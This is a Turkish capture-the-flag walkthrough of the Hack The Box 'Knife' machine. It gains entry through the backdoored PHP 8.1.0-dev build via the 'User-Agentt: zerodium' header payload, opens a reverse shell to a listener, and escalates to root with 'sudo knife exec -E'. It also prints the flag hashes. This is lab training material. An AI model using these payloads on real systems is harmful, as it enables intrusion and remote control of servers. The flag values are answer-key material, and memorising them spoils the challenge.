<img width="748" height="478" alt="1_5ONNUJOdKmVSmWXV_l8JdQ" src="https://github.com/user-attachments/assets/704cef28-7ca1-49a0-891f-d3ac6db0c24d" />

About
Knife is an easy difficulty Linux machine that features an application which is running on a backdoored version of PHP. This vulnerability is leveraged to obtain the foothold on the server. A sudo misconfiguration is then exploited to gain a root shell.




## Keşif

```
nmap -sS -A -p- -T5 10.129.50.161
```

<img width="988" height="358" alt="nmap" src="https://github.com/user-attachments/assets/51abd303-9203-4e65-879f-f98f25696acc" />


Web sitesine göz attım, sayfa içeriğinde ve kaynak kodda (`view-source`) dikkat çekici bir şey yoktu. `ffuf` ile dizin taraması denedim ama anlamlı bir sonuç çıkmadı. Bu noktada isteği Burp Suite ile yakalayıp response header'larına baktım

<img width="1189" height="243" alt="burp" src="https://github.com/user-attachments/assets/6b4d325d-4949-4e48-bf7a-0c385c9da3c0" />

Aynı bilgiyi `curl -v` ile de doğrulayabiliriz:

```
curl -v 10.129.50.161
...
< X-Powered-By: PHP/8.1.0-dev
```

<img width="1189" height="243" alt="burp" src="https://github.com/user-attachments/assets/c1246982-031f-4774-8fe1-d3d150b3955a" />

**PHP 8.1.0-dev** — bu sürüm numarası kritik. Normal bir prod ortamında "-dev" etiketli bir PHP sürümü görmek zaten şüphe uyandırmalı; bunun tarihsel bir arka planı var.

---

## 3. Zafiyet Analizi — PHP 8.1.0-dev Backdoor (Mart 2021 PHP Git Olayı)

### 3.1 Arka Plan

28 Mart 2021'de, PHP'nin kendi kaynak kod deposuna (o dönem `git.php.net` üzerinde barındırılıyordu) saldırganlar tarafından yetkisiz iki commit atıldı. Bu commit'ler, PHP'nin çekirdeğine (`zend_object` sınıflarını yönetim katmanına) kötü amaçlı bir kod parçası ekliyordu. Kod, HTTP isteklerinde **`User-Agentt`** (dikkat: normal `User-Agent` değil, sonunda fazladan bir "t" olan sahte bir header) adlı bir header arıyor, bu header'da `zerodium` string'i geçiyorsa header'ın geri kalan kısmını doğrudan `eval()` benzeri bir mekanizmayla PHP kodu olarak çalıştırıyordu.

PHP ekibi olayı hızlıca fark etti, kötü niyetli commit'leri geri aldı ve kaynak kod deposunu tamamen GitHub'a taşıdı. Ancak bu backdoor'un test/geliştirme amaçlı derlenen bazı **PHP 8.1.0-dev** build'lerinde (o dönemin geliştirme dalı) kısa süreliğine gerçekten var olduğu görüldü — CTF makinelerinde de "eski, backdoor'lu bir dev sürümünü hâlâ prod'da unutmuş sistem yöneticisi" senaryosu olarak sıkça kullanılıyor.

### 3.2 İstismar Mantığı

Backdoor'un çalışma prensibi çok basit bir **header injection → code execution** zinciri:

1. İstemci, hedefe normal bir HTTP isteği atar ama header listesine ekstra bir satır ekler:
   ```
   User-Agentt: zerodium <?php system($_GET['cmd']); ?>
   ```
2. PHP'nin çekirdeğine gömülü kötü niyetli kod, gelen header'lar arasında `User-Agentt` adında (fazladan "t"li, kasıtlı olarak normal header ile karışmasın diye seçilmiş) bir alan arar.
3. Bu header bulunursa ve içeriğinde `zerodium` kelimesi geçiyorsa, header'ın geri kalanı **PHP kodu olarak çalıştırılır** — bu tamamen sunucu tarafında, uygulamanın kendi kodundan bağımsız, doğrudan interpreter seviyesinde gerçekleşen bir RCE'dir.
4. Yani bu, üstte çalışan web uygulamasının (Emergent Medical Idea sitesi) kodunda hiçbir hata olmasa bile çalışır — çünkü zafiyet uygulamada değil, **PHP interpreter'ının kendisinde**.

### 3.3 Pratikte İstismar

Bu zafiyeti otomatikleştiren hazır bir PoC var:

```
https://github.com/flast101/php-8.1.0-dev-backdoor-rce
```

Script iki dosyadan oluşuyor:

- **`backdoor.py`** — yukarıdaki header injection'ı kullanarak tek komutluk RCE sağlıyor, aynı zamanda basit bir interaktif shell açıyor.
- **`reverseshell.py`** — aynı mekanizmayı kullanarak hedefe bir reverse shell komutu enjekte ediyor.

İlk denememde sadece `backdoor.py` çalıştırdım:

```
python3 backdoor.py
Enter the host url:
http://10.129.50.161/

Interactive shell is opened on http://10.129.50.161/
Can't access tty; job control turned off.
```

<img width="441" height="160" alt="backdoor" src="https://github.com/user-attachments/assets/cc8190c6-a235-4787-aab5-d27cb802bcbb" />

Bu bana bir shell verdi ama **tam bir TTY değildi** — `cd` ile dizin gezemiyordum, job control kapalıydı, yani her komut PHP üzerinden tek seferlik çalıştırılıyordu, kalıcı bir oturum/state yoktu. Bu yüzden asıl amacım olan **gerçek bir reverse shell** için `reverseshell.py`'ye geçtim:

Önce kendi makinemde listener'ı ayağa kaldırdım:

```
rlwrap nc -nvlp 4444
```

Sonra exploit'i çalıştırdım:
```
python3 reverseshell.py http://10.129.50.161/ 10.10.14.187 4444
```

<img width="556" height="55" alt="reverseshell" src="https://github.com/user-attachments/assets/8a6e830e-28e4-4cf3-b17c-daa2b1ca9937" />


Bu, hedefte arka planda çalışan PHP interpreter'ına, benim IP/port'uma bağlanan bir bash reverse shell komutu enjekte etti. Listener'da bağlantı geldi:

<img width="647" height="105" alt="shell" src="https://github.com/user-attachments/assets/7f243f8a-fa33-4b69-bf81-5deb4dcb474d" />


Doğrudan **`james`** kullanıcısı olarak (web servisinin çalıştığı kullanıcı) tam bir shell elde ettim.

---

## 4. User Flag

```
james@knife:/home$ cd james
james@knife:~$ cat user.txt
13b979b255e3033972bd054ca0eb9a64
```

<img width="296" height="57" alt="flag1" src="https://github.com/user-attachments/assets/1941df43-72a8-478b-b429-a0df994d4b52" />


## 5. Privilege Escalation — `sudo knife exec`

### 5.1 Keşif

Shell aldıktan sonraki standart refleks: `sudo -l`.

```
james@knife:~$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=...

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

Bu çıktı bize şunu söylüyor: `james` kullanıcısı, **şifre girmeden (`NOPASSWD`)**, `/usr/bin/knife` binary'sini **root olarak** çalıştırabiliyor. `knife`, Chef configuration management aracının komut satırı istemcisi; normalde sunucu/altyapı yönetimi için kullanılıyor ama bazı alt komutları (özellikle `exec`) keyfi Ruby kodu çalıştırabiliyor.

Bu klasik bir **sudo misconfiguration** — GTFOBins'de `knife` için tam olarak bu senaryo dokümante edilmiş: [gtfobins.github.io/gtfobins/knife](https://gtfobins.github.io/gtfobins/knife/).

### 5.2 GTFOBins Payload'ı ve Tırnak Mantığı

GTFOBins'in önerdiği payload şu:

```bash
sudo knife exec -E 'exec "/bin/sh"'
```

Burada kafa karıştıran kısım tırnakların iç içe kullanımı, o yüzden adım adım açıklayayım:

**`knife exec -E '<RUBY KODU>'` ne yapar?**
`knife exec`, Chef'in Ruby tabanlı bir "exec" alt komutudur — `-E` flag'i ile verdiğiniz string'i **doğrudan bir Ruby ifadesi olarak** yorumlayıp çalıştırır. Yani `-E` parametresi bash komutu değil, **Ruby kodu** bekliyor.

**Neden `exec "/bin/sh"` (Ruby'nin `exec`'i)?**
Ruby'de `exec` çağrısı, mevcut process'in yerini verilen komutla değiştirir (Unix'teki `execve()` sistem çağrısının Ruby karşılığı). Yani `knife exec -E 'exec "/bin/sh"'` dediğimizde: knife süreci Ruby yorumlayıcısını başlatıyor, Ruby yorumlayıcısı bizim verdiğimiz `exec "/bin/sh"` ifadesini çalıştırıyor, bu da knife'ın çalıştığı process'i (root yetkisiyle çalışan process'i) doğrudan bir **`/bin/sh` kabuğuna dönüştürüyor**. Yeni bir process açmıyor — var olan, zaten root yetkisine sahip process'in "beynini" değiştiriyor.

**Neden tek tırnak (`'...'`) dış katmanda, çift tırnak (`"..."`) iç katmanda?**
- Dış tırnaklar (**tek tırnak**, `'...'`) **bash'e** ait — bash'e "bu string'i olduğu gibi, hiçbir değişken genişletmesi (`$VAR` gibi) yapmadan `-E` parametresine ilet" diyoruz. Tek tırnak kullanmamızın sebebi, içeride Ruby'nin kendi string syntax'ını (çift tırnak) bozmadan bash'e teslim etmek.
- İç tırnaklar (**çift tırnak**, `"/bin/sh"`) ise **Ruby'ye** ait — Ruby'nin `exec` fonksiyonuna string argüman olarak `/bin/sh` yolunu veriyoruz. Ruby'de string'ler çift ya da tek tırnakla tanımlanabilir; burada path'i normal bir string literal olarak geçiyoruz.

Yani özetle iki farklı dilin (bash ve Ruby) tırnak kuralları iç içe geçiyor: **dıştaki tırnak "bunu bash olarak yorumlama, aynen Ruby yorumlayıcısına ilet" demek, içteki tırnak ise "bu bir Ruby string'i" demek.**

### 5.3 İlk Deneme ve Hata

Yazıda belirttiğim gibi ilk denememde `sudo` eklemeyi unuttum:

```
knife exec -E "exec '/bin/sh'"
```

Bu, `knife`'ı **`james` kullanıcısı yetkisiyle** çalıştırdı — yani `/bin/sh`'a geçtim ama hâlâ `james`'tim, root olmadım. Çünkü `sudo -l` çıktısındaki yetki sadece `sudo` üzerinden çalıştırıldığında geçerli; `knife`'ı doğrudan çağırırsam bu SUID bir binary değil, normal kullanıcı yetkimle çalışır.

### 5.4 Doğru Komut ve Root Shell

`sudo` eklediğimde:

```
james@knife:~$ sudo knife exec -E "exec '/bin/sh'"
# whoami
root
```

<img width="778" height="372" alt="root" src="https://github.com/user-attachments/assets/44a665d7-bb17-46c9-86ca-e800576872ba" />


Bu sefer `knife` süreci **root olarak** başlatıldı (çünkü `sudo` ile çağırdık ve `sudoers` dosyası bunu şifresiz izin veriyordu), Ruby yorumlayıcısı `exec '/bin/sh'` komutunu çalıştırdı ve bu **root yetkili process'i** doğrudan bir root shell'e dönüştürdü.

---

## 6. Root Flag

```
# cd /root
# ls
delete.sh  root.txt  snap
# cat root.txt
59405015fc86d50c9bf255ccb6632292
```

<img width="328" height="55" alt="rootshell" src="https://github.com/user-attachments/assets/c5de83c6-baf6-4d83-b7d8-eb5868699325" />
